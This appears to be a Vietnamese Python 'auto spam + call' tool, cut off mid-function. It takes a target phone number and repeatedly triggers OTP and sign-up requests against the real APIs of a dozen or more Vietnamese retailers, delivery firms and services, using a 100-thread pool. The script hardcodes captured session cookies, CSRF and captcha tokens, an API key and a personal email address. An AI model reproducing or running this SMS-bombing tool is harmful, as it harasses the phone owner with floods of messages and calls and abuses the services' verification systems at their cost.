
import requests, os, time, sys
from concurrent.futures import ThreadPoolExecutor
from time import sleep
xanhla = '\033[1;32m'
trang = '\033[1;37m'
do = '\033[1;31m'
vang = '\033[1;33m'
xanhnhat = '\033[1;36m'
def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
\033[1;34m██╗░░░██╗███╗░░██╗░██████╗░██╗░░██╗██╗░█████╗░
\033[1;33m██║░░░██║████╗░██║██╔════╝░██║░░██║██║██╔══██╗
\033[1;32m██║░░░██║██╔██╗██║██║░░██╗░███████║██║███████║
\033[1;35m██║░░░██║██║╚████║██║░░╚██╗██╔══██║██║██╔══██║
\033[1;36m╚██████╔╝██║░╚███║╚██████╔╝██║░░██║██║██║░░██║
\033[1;31m░╚═════╝░╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚═╝
\033[1;33m╔══════════════════════════════════════════════════════╗
\033[1;33m║\033[1;31m🔥 BY TOOL : {xanhla}UNGHIA                                                              
\033[1;33m║\033[1;32m🔥 FB : {vang} https://www.facebook.com/ungnghiaA/                                                                                       
\033[1;33m║\033[1;34m🔥 \033[1;35mTOOL AUTO SPAM + CALL                                                                                                         
\033[1;33m╚══════════════════════════════════════════════════════╝
"""
    for x in banner:
        sys.stdout.write(x)
        sys.stdout.flush()
        sleep(0.00180)
banner()
# print('─'*50)
sdt = input(f'NHẬP SỐ ĐIỆN THOẠI: ')
if sdt == '0834617174':
    print(f'Số Này Không Thể Spam !!!')
    quit()
spam = int(input(f'SPAM BAO NHIÊU LẦN: '))
delay = int(input(f'DELAY SPAM: '))
print('─'*50)
threading = ThreadPoolExecutor(max_workers=int(100))
def tv360(sdt):
    headers = {
        'authority': 'tv360.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'content-type': 'application/json',
        'origin': 'https://tv360.vn',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
    json_data = {
        'msisdn': sdt,
    }

    response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', headers=headers, json=json_data).json()
    if response ['errorCode'] == 200:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TV360 SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TV360 SPAM THẤT BẠI')
def hoangphuc(sdt):
    headers = {
        'authority': 'hoang-phuc.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://hoang-phuc.com',
        'referer': 'https://hoang-phuc.com/customer/account/create/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'action_type': '1',
        'tel': sdt,
    }
    response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', headers=headers, data=data).json()
    if response ['success'] == True:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m HOÀNG PHÚC SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m HOÀNG PHÚC SPAM THẤT BẠI')

def fmplus(sdt):
    headers = {
        'authority': 'api.fmplus.com.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'authorization': 'Bearer',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://www.fm.com.vn',
        'referer': 'https://www.fm.com.vn/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
        'x-emp': '',
        'x-fromweb': 'true',
        'x-requestid': '320a2995-6b36-445d-aa57-2dc514e31d0e',
    }
    json_data = {
        'Phone': sdt,
        'LatOfMap': '',
        'LongOfMap': '',
        'Browser': '',
    }
    response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data).json()
    if response ['Code'] == 200:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FMPLUS SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FMPLUS SPAM THẤT BẠI')

def winmart(sdt):
    headers = {
        'authority': 'api-crownx.winmart.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://winmart.vn',
        'referer': 'https://winmart.vn/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-api-merchant': 'WCM',
    }
    json_data = {
        'firstName': 'Chi mum',
        'phoneNumber': sdt,
        'masanReferralCode': '',
        'dobDate': '2006-03-24',
        'gender': 'Male',
    }
    response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data).json()
    try:
        if response ['code'] == 'S200':
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m WINMART SPAM THÀNH CÔNG')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m WINMART SPAM THẤT BẠI')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m WINMART SPAM THẤT BẠI')

def gateway(sdt):
    headers = {
        'authority': 'online-gateway.ghn.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
    json_data = {
        'phone': sdt,
        'type': 'register',
    }

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data).json()
    if response ['code'] == 200:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m GHN SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m GHN SPAM THẤT BẠI')
def hine(sdt):
    headers = {
        'authority': 'ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'authorization': '',
        'content-type': 'application/json',
        'origin': 'https://30shine.com',
        'referer': 'https://30shine.com/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
    json_data = {
        'phone': sdt,
    }
    response = requests.post('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', headers=headers, json=json_data,).json()
    if response ['success'] == True:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m 30SHINE SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m 30SHINE SPAM THẤT BẠI')

def medicare(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://medicare.vn',
        'Referer': 'https://medicare.vn/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'X-XSRF-TOKEN': 'eyJpdiI6IkZBTVZlcS9XSXdUb1lscll6d01BMlE9PSIsInZhbHVlIjoiRkRENVR6QUpKNUI5RWZoSTVqc0pmeHBvZTFFdGMxU1ZTQWNYWk5GOWRPbTNJNDFmeUYvbGVXZmcxVmo2QWJMcmdpL0J3dWx3ZzRsSklmT0Y2YVJldHZwSGJDazhZd0QrWVcwM3BGbFpzbndTMjI1bk1pV0xwK1AxTE5LQ0lnU3IiLCJtYWMiOiJjMzBkYzlkNDFiNjY1OTVhODVlN2E0YWVlZTQ4ZGMxYjMwYjQ5ZGRhNTU3ODYyYWUzZmU0MmZiYjFmMGUzNjk3IiwidGFnIjoiIn0=',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    json_data = {
        'mobile': sdt,
        'mobile_country_prefix': '84',
    }
    response = requests.post('https://medicare.vn/api/otp', headers=headers, json=json_data).json()
    try:
        if response ['error_code'] == 'fail':
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m MEDICARE SPAM THẤT BẠI')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m MEDICARE SPAM THÀNH CÔNG')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m MEDICARE SPAM THÀNH CÔNG')

def batdongsan(sdt):
    headers = {
        'authority': 'batdongsan.com.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
    params = {
        'phoneNumber': sdt,
    }
    response = requests.get('https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister', params=params, headers=headers,).json()
    try:
        if response ['data'] == 'success':
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m BATDONGSAN SPAM THÀNH CÔNG')
        else:
            print(f'[BY: REVIEWTOOL] ~ \033[1;35m BATDONGSAN SPAM THẤT BẠI')
    except:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m BATDONGSAN SPAM THẤT BẠI')

def tokyolife(sdt):
    headers = {
        'authority': 'api-prod.tokyolife.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'content-type': 'application/json',
        'origin': 'https://tokyolife.vn',
        'referer': 'https://tokyolife.vn/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
    json_data = {
        'phone_number': sdt,
        'name': 'Chí Mum',
        'password': 'jkhjhgjfdf232',
        'email': 'nthanhhang518@gmail.com',
        'birthday': '2000-07-27',
        'gender': 'male',
    }
    response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data).json()
    if response ['success'] == True:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TOKYOLIFE SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TOKYOLIFE SPAM THẤT BẠI')

def futabus(sdt):
    headers = {
        'authority': 'api.vato.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'content-type': 'application/json',
        'origin': 'https://futabus.vn',
        'referer': 'https://futabus.vn/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-app-id': 'client',
    }

    json_data = {
        'phoneNumber': sdt,
        'deviceId': '73b9cbca-6c66-448e-bc60-b2946513dae3',
        'use_for': 'LOGIN',
    }

    response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data).json()
    if response ['message'] == 'OK':
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FUTABUS SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FUTABUS SPAM THẤT BẠI')

def thegioididong(sdt):
    cookies = {
        '_pk_id.7.8f7e': '9c724764956bef42.1702359947.',
        '_tt_enable_cookie': '1',
        '_ttp': 'KQA3JgCFOt6YHFu4dkvxwHtQliw',
        '_gcl_au': '1.1.1518817158.1722078722',
        'DMX_Personal': '%7B%22UID%22%3A%2264427b53a9f018fb5a07208341e683075e50e904%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        'mwgngxpv': '3',
        '_gid': 'GA1.2.886869943.1722078729',
        '_fbp': 'fb.1.1722078735335.7879853641260818',
        '_ce.clock_event': '1',
        '_ce.clock_data': '17%2C171.225.192.16%2C1%2Cb9cbd8dc13f19f9e7eb854f472bfa274%2CChrome%2CVN',
        '__zi': '3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJc36VghUMIXcUCfMbjDf35vXybwAstKCVd3Kt.1',
        'TBMCookie_3209819802479625248': '424499001722172923rziLe3nNfP7bjIjbJeIpQ4lEXR8=',
        '___utmvm': '###########',
        '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBOgOSeFLhnXEk9Fw8nTeieWrfAVAJIvGbQS9qi_fdPCnUDqNZAGTnqxFkB2BRYv-lnY_z1DfNm22izmf88UogciW0whFg0F8DEbUBJoYXWXgc0_E7xLPETnQlalNqn6Pc4',
        'SvID': 'beline2687|ZqZGB|ZqZF/',
        '_gat': '1',
        '_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1722129686%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_pk_ses.7.8f7e': '1',
        '_ga': 'GA1.1.313192879.1702359943',
        '_ga_TZK5WPYMMS': 'GS1.2.1722129689.4.0.1722129689.60.0.0',
        '_ce.irv': 'returning',
        'cebs': '1',
        'cebsp_': '1',
        '_ga_TLRZMSX5ME': 'GS1.1.1722129686.4.0.1722129698.48.0.0',
        '_ce.s': 'v~ \033[1;35mc6e2ca938eaea49c763466ff529031923bcb71d8~ \033[1;35mlcw~ \033[1;35m1722129717030~ \033[1;35mlva~ \033[1;35m1722129695755~ \033[1;35mvpv~ \033[1;35m3~ \033[1;35mv11.fhb~ \033[1;35m1702359951793~ \033[1;35mv11.lhb~ \033[1;35m1702359951795~ \033[1;35mv11.cs~ \033[1;35m127806~ \033[1;35mv11.s~ \033[1;35mbb7354b0-4c7f-11ef-be80-4b611bbe8e1a~ \033[1;35mv11.sla~ \033[1;35m1722129717670~ \033[1;35mlcw~ \033[1;35m1722129717672',
    }
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ja;q=0.4',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.thegioididong.com',
        'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBPs1LjJxh5Owv4bKmBI0grR-wL-mwH1sMFTvXZVlrpM2yIqgNr2eSZY5kjPMiERdGovLf265Im0BQHkZfklBfyibZ-Kogh2sSbEG3RTQp553JTgXd-3V1LoeFmsBZnDoe4',
    }
    response = requests.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', cookies=cookies, headers=headers, data=data,).json()
    if response ['statusCode'] == 200:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TGDĐ SPAM THÀNH CÔNG')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TGDĐ SPAM THẤT BẠI')

def kingfoodmart(sdt):
    headers = {
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'domain': 'kingfoodmart',
    'sec-ch-ua-mobile': '?0',
    'authorization': '',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'content-type': 'application/json',
    'accept': '*/*',
    'Referer': 'https://kingfoodmart.com/',
    'sec-ch-ua-platform': '"Windows"',
    }
    json_data = {
        'operationName': 'SendOtp',
        'variables': {
            'input': {
                'phone': sdt,
                'captchaSignature': 'AWNCXZbkmtm8HOQPn3e-X5kQpLKbMAsrmlLAIhm2NBWvJStQYJ53ScQcbPQJS8o33FMyHYilnbdPtGcTr8ajL0ZA2QytqGB5tnIJsFZAFSPp-dfJKD5N1MQBZxqqp2xPcQfhYD30MZG-ingJCUGidN_b3Rc:U=2cffb4ffa0000000',
            },
        },
        'query': 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
    }
    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data).json()
    data2 = response['data']['sendOtp']
    if data2 == None:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m KINGFOO SPAM THẤT BẠI')
    else:
        print(f'[BY: REVIEWTOOL] ~ \033[1;35m KINGFOO SPAM THÀNH CÔNG')

def lottemart(sdt): # API lottemart CALL
    headers = {
        'authority': 'www.lot
